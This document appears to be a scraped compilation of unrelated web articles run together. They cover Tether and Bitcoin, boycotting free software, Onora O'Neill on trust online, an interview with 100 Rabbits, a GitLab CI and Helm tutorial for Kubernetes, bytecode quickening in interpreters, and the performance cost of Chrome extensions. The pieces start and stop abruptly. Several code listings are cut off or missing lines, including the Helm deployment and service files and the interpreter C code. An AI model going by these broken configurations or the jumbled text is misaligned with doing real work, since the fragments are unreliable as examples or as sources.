<ul><li>with Bitcoin in freefall, major institutions in the crypto industry had to come together to support the markets – much like <a href="https://www.thebalance.com/long-term-capital-crisis-3306240#:~:text=for%20three%20months.-,Federal%20Reserve%20Intervention,lowering%20the%20fed%20funds%20rate.">commercial banks bailed out LTCM in 1998 </a>to prevent a financial panic</li><li>having Bitcoin as collateral for margin trading is a nightmare for risk management (because the value of the collateral is correlated with the P&amp;L of the trade), and exchanges needed something stable to prevent a meltdown of cascading liquidations  </li></ul>



<h3>Follow the Tethers</h3>



<p>Given the explosion of online trading due to the lockdown, it’s not hard to imagine how the demand for USDT skyrocketed, as exchanges needed to fund their client’s margin positions. The increase of USDT would then mirror, to an extent, the inflows of money in the crypto gambling ecosystem.</p>



<p>At the same time, this explosion of trading activity meant big profits for the unregulated exchanges, which propped up Bitcoin as those exchanges stored at least a portion of their gains in Bitcoin.

<p>When we use proprietary software, we are under the power of the owner of the software. The owner's revenue depends on us, either directly through purchases and solutions, or indirectly by advertising. There is a relationship of power, with the owner having power over us.</p>
<p>When we fell that the owner is doing something unethical, we might choose to refuse to use their software. We do this to put financial pressure on them to change their practices. We may also do it to disassociate ourselves from them, showing we disapprove of their actions. We may boycott this way in many other situations, it makes sense to extend it to software.</p>
<p>In contrast, Free and Open Source Software (FOSS) has no owner. Most free software is primarily maintained by one individual or group, but licenses give users power over the software, allowing us to control it to the same extent as anyone else. The power balance is shifted.</p>
<p>When the primary developer of a free program does something we find unethical, many are inclined to approach the matter similarly. However, with free software we are not bound by the program or the developer in the same way. We do not remove ourselves from someone's power when we boycott free software. We just restrict our own access to a potentially useful program.</p>
<p>If the software has features we don't like, we can remove them. If the software is hosted by one organization, we can deploy it ourselves. If these are impractical, or if the software is not actually useful, we can abandon it. But we do not need to give up on certain free programs based on reasons other than the software itself.</p>
<p>Of course, one may be boycotting programs made by a particular developer in an effort to hurt their feelings. This is a foolish reason to oppose software. Emotional manipulation is not going to solve any problems.</p>
<p>Unfortunately, I've seen all of this happen in FOSS communities. People refuse to use helpful software because of disagreements with the author. Worse yet, those who do use the software are sometimes shamed. This is terribly effective at weaving disunity within our own communities.</p>
<p>It is unnecessary to sow bitterness within ourselves and others for even a seemingly noble goal. The only result is smug superiority: "We aren't one of <em>them</em> who associate with one of <em>those</em> developers." Frivolously dividing our communities based on software usage is not worthwhile.</p>
<p>We cannot enrich society with free and open source software when we are busy attacking some of those making it.</p>

				<p><em>Onora O’Neill, professor emeritus of philosophy at Cambridge University and a member of the British House of Lords, has been selected for the 2017 $1 million </em><a href="http://berggruen.org/" data-wpel-link="external" target="_blank" rel="external noopener noreferrer"><em>Berggruen Prize</em></a><em>.</em></p>
<p>London — Near the conclusion of the Brexit referendum campaign last year, Michael Gove, then the British justice secretary, infamously said that “people in this country have had enough of experts…” If you watch the <a href="https://www.youtube.com/watch?v=GGgiGtJk7MA" data-wpel-link="external" target="_blank" rel="external noopener noreferrer">video</a> of the interview, Gove had begun to say something more specific but was interrupted by a particularly hectoring interviewer. He has since clarified that he had <a href="http://www.bbc.com/news/uk-39102840" data-wpel-link="external" target="_blank" rel="external noopener noreferrer">intended</a> to say that the public has had enough of <em>economists</em>.</p>
<p>We can all giggle about that now, but it is the literal and uncharitable reading of Gove’s remark that still makes headlines and comes up in discussions of the idea that we live in a post-fact or post-truth era. Suspicion of experts and professionals is not new. Claims that experts were engaged in some sort of conspiracy against the public or the public interest were widely voiced during the 1980s, and accusations of “professional coziness” were cited as reasons for shifting from professional to regulatory discipline of experts. But the current suspicion of experts is more troubling and cannot be addressed by regulatory remedies — they would be promptly tarred with the same brush.</p>
<p>Is this heightened suspicion of experts an inevitable effect of digital communications technologies? I suspect that the problem may lie not with the technologies themselves but with the disruption to practices and standards for communication that have followed their chaotic introduction. These technologies enable voluminous, remote and anonymous dissemination of content whose trustworthiness — or lack of trustworthiness — is hard to judge. While the ethics of communication is about the standards that speech acts should meet, new technologies make it hard to identify which acts are being undertaken, let alone to judge whether they are trustworthy.</p>
<p>This is not the first time that new technologies have disrupted established communicative practices and standards. Plato tells us that Socrates was so worried by the written word’s disruption of communication that he relied entirely on the spoken word. Luckily Plato did write, or we would know nothing about Socrates’ misgivings. Socrates worried his words would go fatherless into the world, reaching sundry readers with nobody present to explain what was meant or to clear up misunderstandings.</p>
<p>The problem with writing, however, was not that texts can be separated from their authors and cannot explain themselves, but that the practices of attribution, validation, authorization and commentary, on which writing and publishing now depend, had not been developed in ancient Greece. Now that those practices and standards are in place, we often think of the written word as a particularly robust and reliable way of communicating content accurately and responsibly.</p>
<p>A second wave of difficulties arose with the development of printing. Once again, the difficulties were not due to the technology but to the disruption caused by innovation. Laws had to be enacted and practices developed in order to define the respective roles and responsibilities of authors, printers and publishers. New laws had to provide remedies for the wrongs that can be inflicted by distributing printed material, ranging from defamation to breach of copyright, from fraud to breach of privacy, and from misleading advertising to breaches of commercial and professional confidentiality. It took a long time and a lot of struggle to reshape legal requirements and social and cultural practices to ensure that they both protected free speech and prevented and limited wrongs that can be done by widely distributed printed communication.</p>
<p>The situation is similar with online communication. Legal and cultural measures needed to secure ethical standards in communication have been massively disrupted, leaving us less able to judge whether others’ claims are honest, competent and reliable. Seemingly direct, unmediated, even intimate online communication sometimes turns out to emanate from or to have been shared with unknown others. Seemingly professional and expert claims sometimes misrepresent or falsify. Seemingly original material sometimes turns out to have been plagiarized. Yet the ethical standards and the epistemic norms that matter for trustworthy communication, and that underpin the possibility of checking and challenging what others communicate, matter every bit as much for online as for offline communication.</p>
<p>As one might expect, the new technologies have charm and advantages, and there is great reluctance to recognize how much needs to be done to reconstruct ethically adequate standards for communication. We are still in a period of gestures and platitudes. Cyber romantics still suggest that any restriction of online communication would be wrong; they forget that free speech&nbsp;is only one of the many standards that matter for the ethics of communication.</p>
<p>Well-meaning discussions suggest that improving digital literacy might be useful, so that those on the receiving end of communication are less likely to be deceived. But while improving digital literacy is surely a good idea, we can hardly expect it to remedy the serious wrongs that can be done by some online communication. At present, we have not even developed a clear distinction between online platforms and online publishers, so we have no account of their respective responsibilities. There is a long way to go.</p>

                <p><em>Perhaps best known for their esoteric livecoding language ORCΛ, <a href="https://100r.co/" target="_blank" rel="noopener">100 Rabbits</a> (Rekka and Devine) have a creative practice that seamlessly crosses from the esoteric to the practical. Living on a boat and relying primarily on solar energy, they create their own tools to avoid the impracticalities and wastefulness of commercial software.

<p><strong>» There is an idealism to many of your projects that reminds me of the early Web or perhaps the Amiga era, with a sense that anything is fair game to be re-thought; from the recipe site&nbsp;<a href="https://grimgrains.com/" target="_blank" rel="noopener">grimgrains</a> with its unusual sign to even representations of time and dates with <a href="https://wiki.xxiivv.com/site/time.html" target="_blank" rel="noopener"><em>Neralie</em> and <em>Arvelie</em></a>. *</strong></p>
<p><strong>This extends to the tools you adopt by others, like Plan 9 and Gemini, that are not as widely used or supported but are built on better logical or aesthetic principles.</strong></p>
<p><strong>I'd like to begin by asking you to describe a bit of your creative philosophy and process as a team.</strong></p>
<p>Our development philosophy comes down to a strong belief that solving problems is more efficient than looking for solutions.</p>
<p>I say this to mean that, based on personal experiences, searching for a password is more expensive and less fulfilling than cracking the safe itself. It does mean reinventing the wheel many times over, but the process has led us to many unforeseen places, often in areas we had previously taken for granted, or considered solved.</p>

</ul>
<p>We will always choose a lesser home-brewed tool tailored specifically to our own needs, over a better generic tool that we have not built and do not understand. This scenario is often called the "Not Invented Here"(NIH) syndrome. It's a choice we made that works for our unique financial situation, but it's not something that we advocate for, or that we think would scale well in for-profit environments.</p>
<p><strong>» Orca is an esoteric language. It is also a live-coding environment, which means what it is esoteric to is a different set of behaviors, mainly languages designed for performance, with programs that can be altered as they run. This crossover is unusual, and I'm curious first could you describe how the idea of Orca evolved?</strong></p>
<p><strong>For instance, was the idea of each letter corresponding to a command part of the original concept, or did it grow from experiments?</strong></p>
<p>Orca was first a terminal utility designed to simulate moves on a game-board to help with the development of a project called Markl, in which the state of each character is represented by a single character.</p>
<p>The simulator was later re-purposed into a demake of Pico, a color-based game created a few years prior. This early iteration of Orca included some of the operators that are still part of it today. As the Pico playground became more popular, people started to point at the name and its overlapping with that of Pico-8 so the name was changed.</p>
<p><iframe src="https://www.youtube.com/embed/1h7vQFH9xFM" width="560" height="315" frameborder="0" allowfullscreen=""></iframe><br><em>First video of Orca</em></p>
<p>After asking around if anyone had a good name for a black and white monster, someone recommended Orca. We thought it fitting, and adopted the name.</p>
<ul>
<li><a href="https://www.youtube.com/watch?v=kN7dUqMtIWU" target="_blank" rel="noopener">Pico3</a></li>
<li><a href="https://www.lexaloffle.com/pico-8.php" target="_blank" rel="noopener">Pico8</a></li>
</ul>
<p>We weren't very familiar with the concept of live-coding at that time, Orca was still described as Dwarf Fortress for music. I was growing increasingly interested in the Algorave scene, for which, the tagline is: <strong>Show Us Your Screens</strong>.</p>
<ul>
<li><a href="https://www.ft.com/content/0b64ec04-c283-11e9-ae6e-a26d1d0455f4" target="_blank" rel="noopener">Algorave</a></li>
<li><a href="https://www.youtube.com/watch?v=aFjvYnJWMUo" target="_blank" rel="noopener">Orca controlling lights</a></li>
<li><a href="https://www.youtube.com/watch?v=MgNDwUx2Tb4" target="_blank" rel="noopener">Orca self-replication</a></li>
</ul>
<p>Orca seemed like the ideal candidate for a livecoding performance as it was designed from the ground-up as a golfing language, making it very fast compared to verbose languages like Haskell and Lisp. Operators like the cardinals(N, S, E &amp; W) made it easier for the audience to track where all the notes were coming from.</p>
<ul>

<li><a href="https://www.youtube.com/watch?v=5lxFYv5vIm4" target="_blank" rel="noopener">Orca controlling Playground</a></li>
</ul>
<p><strong>» Did (non-livecoding) esolangs influence its design or internal logic at all? I know you've written about FRACTRAN; also the Funges come to mind with Orca's N, S, E, and W operators.</strong></p>
<p>I became aware of esolangs during the development of Orca, I knew of <a href="https://en.wikipedia.org/wiki/Brainfuck" target="_blank" rel="noopener">Brainfuck</a> and <a href="https://esolangs.org/wiki/Nock" target="_blank" rel="noopener">Nock</a>, but I can't say that I fully understood the point of those until later when I started to be more interested in programming.</p>

<p><strong>» Tell me about the larger Orca community. Has anyone created something with Orca that truly surprised you? Given the size of the community and language ecosystem (with Orca functioning as four different versions), is supporting the language a large ongoing task?</strong></p>
<p>Some people have used Orca to control microcontrollers, visuals, and video games. There was a robotics student in France who used Orca to move an articulated arm which was pretty neat.</p>
<ul>
<li><a href="https://www.youtube.com/watch?v=K7moEYBqckc" target="_blank" rel="noopener">Orca controlling NES</a></li>
<li><a href="https://www.youtube.com/watch?v=sqcFjBiHx14" target="_blank" rel="noopener">Orca to play Mario Bros</a></li>
</ul>
<p>The specs have not changed dramatically for some time, the operators have grown organically based on feedback from the community. Each implementation has different maintainers who try to follow the specs as best as they can, but each platform has their own specific needs, and therefore, their own specific operators.</p>
<p>For example, the Norns implementation in Lua has a LOT of custom operators to control the various sound engines of the device.</p>
<ul>
<li><a href="https://llllllll.co/t/orca/22492" target="_blank" rel="noopener">Orca Norns</a></li>
</ul>
<p><strong>» Also, I have to ask about Lietal. It's provided names for many of your projects (Arvelie etc) but do you also use it at all for every-day communication? What is it like to think in terms of Lietal?</strong></p>
<p>Despite Lietal having its own syntax and grammar, it was originally meant as a synthetic language to create loanwords that can be used as part of other languages. For example, members of the <a href="https://wiki.xxiivv.com/site/merveilles.html" target="_blank" rel="noopener">Merveilles</a> community adopted the use the old Lietal word "xoka", to say hello, which doesn't quite translate to <em>hello</em> but as "it's nice of you to come toward me".</p>
<p>Lietal was also created to indicate the names of spaces or things in the Neauismetica conworld which lives as music, games and illustrations.</p>
<ul>
<li><a href="https://wiki.xxiivv.com/site/neauismetica.html" target="_blank" rel="noopener">Neauismetica</a></li>
</ul>
<p>The main concept of Lietal is that <em>to talk about something, you must first understand what you're trying to describe</em>. It's built from first principles, the philosophical idea being that every permutation of every elementary particle of the language would mean all things true and false.</p>
<p><img src="https://esoteric.codes/uploads/6c3e6d40-2b80-4e20-a319-29e0897885c4/100rabbits_pino.png" alt="" width="" height=""></p>
<p><strong>» How has your philosophy about open-source / free software / right to repair affected your distribution channels (the Apple Store, etc) and what technologies you adopt? You seem to work with a mix of newer and older platforms (like 6502); has this been a challenge in keeping the work accessible and usable?</strong></p>
<p>Our philosophy of software development is advised principally by our lifestyle and the internet and power scarcity that it entails. Since we build everything from a sailboat, our power comes principally from the solar energy we collect throughout the day. We normally only work on the computer while the sun is up.</p>
<p>This restriction forced us to consider ways to extend the life of our computer's batteries by discarding heavy toolchains, such as XCode. Bloated software such as Slack, or DRM-protected software such as Photoshop, were not viable options to us, so we turned to open-source to find software that we could repair ourselves, and that did not require constant internet access.</p>
<p>We found that even within open-source, a lot of software was poorly-built and did not address our specific needs, so we began building the missing pieces ourselves. We tried using web technologies at first, but the resulting applications were slow and inefficient, we have since rebuilt our tools in plain C.</p>

</ul>
<p><strong>» You created your own LISP dialect, Lain, which now drives your image-drawing software, Ronin. First, why did you decide to do this as a LISP in particular, and what was it like constructing the language and building its first interpreter? Have you found that it's approachable for users of the platform? Also, it strikes me how inter-connected these projects are: there are many images on your site that seem to have used the de-saturation feature of Ronin.</strong></p>
<p>I wanted a simple LISP to do some basic repetitive graphical tasks(resizing, cropping, etc), so I built a little playground to experiment with. The playground turned into a fully-featured engine to do photo manipulation and was a great help at that time, it allowed us to work from a Chromebook after one of our main laptop died, which was very handy.</p>
<ul>
<li><a href="https://github.com/hundredrabbits/Ronin/blob/master/scripts/library.js" target="_blank" rel="noopener">Ronin Library</a></li>
</ul>
<p>We've used Ronin to resize, sharpen and colorize almost all the photos from our sites between 2017 and 2019. Lisp is a simple language to start exploring some more esoteric concepts and move away from more traditional languages. Lisp is a slippery slope that leads inevitably to Forth.</p>
<ul>
<li><a href="https://wiki.xxiivv.com/site/forth.html" target="_blank" rel="noopener">Forth</a></li>
</ul>
<p><strong>» Do "Lain" and "Ronin" come from Lietal words with specific meanings?</strong></p>
<p>The name Lain for the lisp dialect comes from the anime series with the same name, in which the main character uses Lisp on her laptop.</p>
<p><strong>» Lietal sounds like a Lojban-like language (a logical language for human expression) or perhaps Toki Pona, which promotes honesty (as a more realistic way of getting at "truth"). Is the thinking of Lietal built around trying to get the speaker to understand the core of what they're saying?</strong></p>
<p>It's kind of a side-effect, in the sense that there are only 27 Lietal "words", everything else are compounds of these basic words. Saying complex things take a long time, and two people with a different understanding of a <em>thing</em> might not understand each other. You cannot say in Lietal(except for loanwords) "What is X", since for saying X, you must first describe it.</p>

<p><strong>» What role does the Neauismetica plays in your work? Is it something to daydream about, a set of stories that have been written, or is it more a general idea that fuels other projects?

<p>The Neauismetica is a conworld that exists through the music, games, aesthetics, and language of a lot of the related projects. When I began writing about the world of Dinaisth, I had no plans to be …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Everyone loves GitLab CI and Kubernetes.</p>
<p>GitLab CI (Continuous Integration) is a popular tool for building and testing software developers write for applications. GitLab CI helps developers build code faster, more confidently, and detect errors quickly.</p>
<p>Kubernetes, popularly shortened to K8s, is a portable, extensible, open-source platform for managing containerization workloads and services. K8s is used by companies of all sizes everyday to automate deployment, scaling, and managing applications in containers.</p>
<p>The purpose of this post is to show how you can bolt on the Continuous Delivery (CD) piece of the puzzle to build a CI/CD pipeline so you can deploy your applications to Kubernetes. But before we get too far, we're going to need to talk about Helm, which is an important part of the puzzle.</p>
<h2>What the Helm?</h2>
<p><a href="https://helm.sh/">Helm calls itself "the package manager for Kubernetes".</a> That's a pretty accurate description. Helm is a versatile, sturdy tool DevOps engineers can use to define configuration files in, and perform variable substitution to create consistent deployments to our clusters, and have different variables for different environments.</p>
<p>It's certainly the right solution to the problem we're covering here.</p>
<h2>How do we do it?</h2>
<p>First off, a few prerequisites. You’re going to have to have this all hammered out before you started with the project. There’s links to helpful documentation below if you need help.</p>
<p>Or, you could always <a href="https://nextlinklabs.com/contact">get in touch with us</a> and we could talk about your project together.</p>
<ol>
<li>You already have an <a href="https://docs.aws.amazon.com/eks/latest/userguide/getting-started.html">Amazon EKS cluster</a>.</li>
<li>You already know how to use <a href="https://docs.gitlab.com/ee/ci/">GitLab CI</a>.</li>
<li>You have a <a href="https://docs.gitlab.com/runner/executors/kubernetes.html">GitLab CI runner</a> configured in your Kubernetes cluster.</li>
<li>You have the <a href="https://github.com/kubernetes-sigs/aws-load-balancer-controller">AWS Load Balancer Controller</a> running in your cluster.</li>
</ol>
<p>With those boxes checked, we can get started. You'll want to create a new repository in GitLab first for us to use in this example. Once you've done that we can get started with creating our files.</p>
<h2>File tree</h2>
<p>Basically, at the end our folder/file structure is going to look like this:</p>
<div data-language="text"><pre><code>&lt;dir&gt;
├── chart/
|   ├── Chart.yaml
|   ├── values.yaml
|   └── templates/
|      ├── deployment.yaml
|      ├── service.yaml
|      ├── ingress.yaml
|      └── configmap.yaml
└── gitlab-ci.yml</code></pre></div>
<h3>values.yaml</h3>
<div data-language="text"><pre><code>applicationName: my-first-app
certArn: your-certificate-arn
domain: your domain name
subnets: your subnets
securityGroups: your security groups</code></pre></div>
<h3>deployment.yaml</h3>
<div data-language="text"><pre><code>apiVersion: apps/v1

    matchLabels:
      app: {{ .Values.applicationName }}
  template:

      labels:
        app: {{ .Values.applicationName  }}
    spec:

          imagePullPolicy: Always
          image: nginx:1.19.4
          ports:
            - containerPort: 80
          volumeMounts:
            - mountPath: /usr/share/nginx/html/index.html
              name: nginx-conf
              subPath: index.html
      volumes:
        - name: nginx-conf
          configMap:
            name: {{ .Values.applicationName  }}-configmap</code></pre></div>
<p>This is the configuration file that defines our deployment. You can see there are a few lines with <code>{{ some text }}</code>. This is how we use a variable we define in our values file within our chart.</p>
<h3>configmap.yaml</h3>
<div data-language="text"><pre><code>apiVersion: v1
kind: ConfigMap
metadata:
  name: {{ .Values.applicationName }}-configmap
  namespace: {{ .Values.applicationName }}
data:
  index.html: |
    &lt;html&gt;
    &lt;head&gt;
      &lt;h1&gt;My first Helm deployment!&lt;/h1&gt;
    &lt;/head&gt;
    &lt;body&gt;
      &lt;p&gt;Thanks for checking out my first Helm deployment.&lt;/p&gt;
    &lt;/body&gt;
    &lt;/html&gt;</code></pre></div>
<p>This config map just defines a simple index page that we'll display for our app.</p>
<h3>service.yaml</h3>
<div data-language="text"><pre><code>apiVersion: v1

<h2>Okay we have all the files. Now what?</h2>
<p>Well, after you have all the files defined and your infrastructure follows our prerequisites, there's not much left to do.</p>
<p>If you commit these files, GitLab will interpet your <code>.gitlab-ci.yml</code> file and initiate a pipeline. Our pipeline only has one stage and one job (deploy). It'll spin up a container in the cluster for the deployment using the <code>helm:3.2.1</code> image and run our <code>script</code> command. This does all of the heavy lifting for us with creating all of the files required in our namespace and starting our application.</p>
<p>If you configure in Route53 a DNS record like <code>my-first-app.my-domain.com</code> with an A record to the load balancer that the ingress controller created, you'll see the index page we defined in the configmap!</p></div></div>]]>

February 7, 2021 | https://bernsteinbear.com/blog/inline-caching-quickening/ | <a href="https://web.archive.org/web/*/https://bernsteinbear.com/blog/inline-caching-quickening/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>In my <a href="https://bernsteinbear.com/blog/inline-caching/">last post</a> I discussed inline caching as a
technique for runtime optimization. I ended the post with some extensions to
the basic technique, like <em>quickening</em>. If you have not read the previous post,
I recommend it. This post will make many references to it.</p>

<p>Quickening involves bytecode rewriting — self modifying code — to remove
some branches and indirection in the common path. Stefan Brunthaler writes
about it in his papers <a href="https://publications.sba-research.org/publications/dls10.pdf">Efficient Interpretation using Quickening</a>
and <a href="https://publications.sba-research.org/publications/ecoop10.pdf">Inline Caching Meets Quickening</a>.</p>

<h2 id="the-problem">The problem</h2>

<p>Let’s take a look at a fragment of the caching interpreter from the last post
so we can talk about the problem more concretely. You can also get the sources
<a href="https://github.com/tekknolagi/icdemo">from the repo</a> and open <code>interpreter.c</code>
in your preferred editor.</p>

<p>As I also mentioned last post, the <code>ADD</code> opcode handler has three cases to
handle:</p>

<ol>
  <li>Cache is empty</li>
  <li>Cache has the wrong key</li>
  <li>Cache has the right key</li>
</ol>

<p>Since Deutsch &amp; Schiffman found that types don’t vary that much, the third
case is the fast path case. This means that we should do as little as possible
in that case. And right now, we’re doing too much work.</p>

<p>Why should we have to check if the cache slot is empty if in the fast path it
shouldn’t be? And why should we then have to make an indirect call? On some
CPUs, indirect calls are <a href="https://bernsteinbear.com/blog/inline-caching-quickening/calls">much slower</a> than direct calls. And this
assumes the compiler generates a call instruction — it’s very possible that a
compiler would decide to inline the direct call.</p>

<p>Quickening is a technique that reduces the number of checks by explitly marking
state transitions in the bytecode.</p>

<h2 id="removing-the-empty-check">Removing the empty check</h2>

<p>In order to remove one of the checks — the <code>method == NULL</code> check — we can
add a new opcode, <code>ADD_CACHED</code>. The <code>ADD_CACHED</code> opcode can skip the check
because our interpreter will maintain the following invariant:</p>

<p><strong>Invariant:</strong> The opcode <code>ADD_CACHED</code> will appear in the bytecode stream <em>if
and only if</em> there is an entry in the cache at that opcode.</p>

<p>After <code>ADD</code> adds something to the cache, it can rewrite itself to <code>ADD_CACHED</code>.
This way, the next time around, we have satisfied the invariant.</p>

</code></pre></div></div>

<p>Not too different. We’ve shuffled the code around a little bit but overall it
looks fairly similar. We still get to share some code in <code>add_update_cache</code>, so
there isn’t too much duplication, either.</p>

<p>Now that we’ve moved the empty check, it’s time to remove the indirect call.</p>

<h2 id="removing-the-indirect-call">Removing the indirect call</h2>

<p>Let’s assume for a minute that you, the writer of a language runtime, know that
most of the time, when people write <code>a + b</code>, the operation refers to integer
addition.</p>

<p>Not many other primitive types implement addition. Frequently floating point
numbers use the same operator (though languages like OCaml do not). Maybe
strings. And maybe your language allows for overloading the plus operator. But
most people don’t do that. They add numbers.</p>

<p>In that case, you want to remove as much of the overhead as possible for adding
two numbers. So let’s introduce a new opcode, <code>ADD_INT</code> that is specialized for
integer addition.</p>

<p>In an ideal world, we would just be able to pop two objects, add them, and move
on. But in our current reality, we still have to deal with the possibility of
programmers passing in a non-integer every once in a while.</p>

<p>So first, we check if the types match. If they don’t, we populate the cache and
transition to <code>ADD_CACHED</code>. I’ll get to why we do that in a moment.</p>

<p>And if we did actually get an int, great, we call this new function
<code>do_add_int</code>.</p>

</code></pre></div></div>

<p>This is a nice opcode handler for <code>ADD_INT</code>, but right now it’s orphaned. Some
opcode has to take the leap and rewrite itself to <code>ADD_INT</code>, otherwise it’ll
never get run.</p>

<p>I suggest we make <code>ADD</code> do the transition. This keeps <code>ADD_CACHED</code> fast for
other types. If <code>ADD</code> observes that the left hand side of the operation is an
integer, it’ll call <code>do_add_int</code> and rewrite itself.</p>

  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Back to “why transition from <code>ADD_INT</code> to <code>ADD_CACHED</code>”. Two thoughts:</p>

<ol>
  <li>
    <p>We could transition back to <code>ADD</code>. In that case, this code would perform
poorly in an environment where the programmer passes multiple different
types at this opcode. There would be a lot of bytecode rewriting overhead
going on as it goes back and forth between <code>ADD</code> and <code>ADD_INT</code>.</p>
  </li>
  <li>
    <p>We could also assume it’s a hiccup and <em>not</em> rewrite. This would perform
poorly if the first time the argument is an integer, but something else
every subsequent operation. There would be a lot of <code>lookup_method</code> calls.</p>
  </li>
</ol>

<p>A great extension here would be to add a polymorphic cache. Those are designed
to efficiently handle a small (less than five, normally) amount of repeated
types at a given point.</p>

<h2 id="why-is-this-faster">Why is this faster?</h2>

<p>Even if we leave the interpreter in this state, a small C bytecode interpreter,
we save a couple of instructions and some call overhead in the fast path of
integer addition. This is a decent win for math-heavy applications.</p>

<p>In the best case, though, we save a great deal of instructions. It’s entirely
possible that the compiler will optimize the entire body of <code>ADD_INT</code> to
something like:</p>

<div><div><pre><code>pop rax
pop rcx
cmp rax, $IntTag
jne slow_path
add rcx
push rcx
jmp next_opcode
slow_path:
; ...
</code></pre></div></div>

<p>It won’t look exactly like that, due to our object representation and because
our <code>push</code>/<code>pop</code> functions do not operate on the C call stack, but it will be a
little closer than before. But what if we could fix these issues and trim down
the code even further?</p>

<p>Then we might have something like the <a href="https://github.com/dart-lang/sdk/blob/b1c09ecd8f30adc02f7623f6137e07a51a648dc3/runtime/vm/compiler/backend/il_x64.cc#L3549">Dart intermediate
implementation</a> of addition for small integers on x86-64. The
following C++ code emits assembly for a specialized small integer handler:</p>

<div><div><pre><code><span>void</span> <span>CheckedSmiOpInstr</span><span>::</span><span>EmitNativeCode</span><span>(</span><span>FlowGraphCompiler</span><span>*</span> <span>compiler</span><span>)</span> <span>{</span>

  <span>__</span> <span>movq</span><span>(</span><span>result</span><span>,</span> <span>left</span><span>);</span>
  <span>__</span> <span>addq</span><span>(</span><span>result</span><span>,</span> <span>right</span><span>);</span>
  <span>// ...</span>
<span>}</span>
</code></pre></div></div>

<p>This example is a little bit different since it is using an optimizing compiler
and assumes the input and output are both in registers, but still expresses the
main ideas.</p>

<p>See also the JVM <a href="https://github.com/openjdk/jdk/blob/a6d950587bc68f81495660f59169b7f1970076e7/src/hotspot/cpu/x86/templateTable_x86.cpp#L1338">template interpreter implementation</a> for binary
operations on small integers:</p>

<div><div><pre><code><span>void</span> <span>TemplateTable</span><span>::</span><span>iop2</span><span>(</span><span>Operation</span> <span>op</span><span>)</span> <span>{</span>
  <span>// ...</span>
  <span>__</span> <span>pop_i</span><span>(</span><span>rdx</span><span>);</span>
  <span>__</span> <span>addl</span> <span>(</span><span>rax</span><span>,</span> <span>rdx</span><span>);</span>
  <span>// ...</span>
<span>}</span>
</code></pre></div></div>

<p>which pops the top of the stack and adds <code>rax</code> to it. I think this is because
the JVM caches the top of the stack in the register <code>rax</code> at all times, but I
have not been able to confirm this. It would explain why it adds <code>rax</code> and why
there is no <code>push</code>, though.</p>

<h2 id="exploring-further">Exploring further</h2>

<p>There are a number of improvements that could be made to this very simple demo.
Bytecode rewriting can unlock a lot of performance gains with additional work.
I will list some of them below:</p></div></div>

        <p>I tested how the 1000 most popular Chrome extensions affect browser performance.</p>
<p>The main metrics I'll consider are CPU consumption, memory consumption, and whether the extension makes pages render more slowly.</p>
<p>Here's a <a href="https://www.debugbear.com/chrome-extension-performance-lookup">list of all tested extensions and their results</a>.</p>
<p><em>Update 8 July 2020: I originally reported the simulated FCP metric provided by Lighthouse rather than the First Contentful Paint observed in the browser. I've now updated the charts and the list of extensions.</em></p>

<h2 id="performance-impact-of-the-top-100-extensions">Performance impact of the Top 100 extensions</h2>
<p>Let’s start by looking at the 100 most used Chrome extensions. Each of these has been installed more than 2 million times.</p>
<p>We’ll look at four different metrics:</p>
<ul>
<li><strong>Page CPU time</strong> How long is the page main thread busy for, and what is it doing?</li>
<li><strong>Page rendering delays</strong> How long does it take until the page displays some content?</li>
<li><strong>Background CPU time</strong> How much processing does the extension do in the background?</li>
<li><strong>Browser memory consumption</strong> How much memory do different components of the browser use?</li>
</ul>
<h3 id="page-cpu-usage">Page CPU Usage</h3>
<p>JavaScript execution or running layout logic blocks the browser main thread. This means the browser can’t respond to user interactions.</p>
<p>If no extension is installed loading example.com takes around 40ms of CPU time. If you’ve installed Evernote or Grammarly this jumps to over 500ms.</p>
<p>This chart shows the 20 slowest extensions out of the 100 most used Chrome extensions. The other 80 all add less than 100ms of additional CPU time to the page.</p>
<p><img src="https://www.debugbear.com/public/blog/2020-chrome-extension-performance-report/chrome-extension-page-cpu-time.png" alt="On-page CPU time by Chrome extension, Top 100"></p>
<p>Rather than targeting specific sites, these extensions add code to every page opened by the user. Let’s take a look at what some of they are doing.</p>
<h4 id="evernote-web-clipper">Evernote Web Clipper</h4>
<p>The Evernote extension has over 4 million users. It adds a 2.9MB content script to every page. 140ms are spent just parsing and compiling that code.</p>
<p><img src="https://www.debugbear.com/public/blog/2020-chrome-extension-performance-report/evernote-page-trace.png" alt="Evernote trace showing code being parsed, compiled, and executed"></p>
<p>Once the bundle has been loaded it needs to be evaluated, which takes another 300ms.</p>
<p>Does this code actually do anything? As far as I can tell, no, not unless the user clicks the Evernote extension icon.</p>
<p>The code does set up an event listener that’s fired when the user clicks the icon, but this can be done without loading the full JavaScript bundle.</p>
<h4 id="grammarly-clever-avira-password-manager-skype">Grammarly, Clever, Avira Password Manager, Skype</h4>
<p>This pattern of loading large amounts of unnecessary code repeats with other Chrome extensions.</p>

<table id="chrome-extension-cpu-table">
  <thead>
  <tr>
   <th>Extension

   <th>Page Script Size

  <tr>
   <td>Skype
   </td>
   <td>1.5MB

   <td>191ms
   </td>
  </tr>
</tbody></table>

<p>Extensions often need to inject code into every page, rather than only targeting certain domains. Password managers need to check if there's a login form. Spell checkers need to look for text fields.</p>
<p>However, for performance it would be much better if the code that checks the relevant conditions was separated from the primary functionality of the extension. Then most of the code would only be loaded when necessary. Honey made this change last year and it <a href="#grammarly-and-honey">greatly reduced their performance impact</a>.</p>
<p>Interestingly, Skype only adds 150ms of CPU time, even though it has a large JavaScript bundle. My guess is that this is due to the code mostly consisting of static configuration objects and long strings that are easy to parse and evaluate.</p>
<h4 id="ghostery">Ghostery</h4>
<p>I was surprised to see Ghostery relatively high up in the list. Unlike the other extensions it actually does something on the page, namely displaying how many trackers were blocked.</p>
<p>Ghostery loads 160KB of JavaScript and adds 120ms of CPU time –&nbsp;not a huge amount. However some of this code is render-blocking, as we’ll see in the next section.</p>
<h3 id="page-rendering-delays">Page rendering delays</h3>
<p>While extra CPU time means the page isn’t interactive for some time, this doesn’t normally completely block the page from rendering. To see if an extension blocks rendering we can look at the <a href="https://www.debugbear.com/docs/metrics/first-contentful-paint">First Contentful Paint</a> metric –&nbsp;when the browser starts to display text or images.</p>
<p>Most extensions introduce no or only minor rendering delays. This chart shows the extensions with the largest negative impact on initial content rendering.</p>
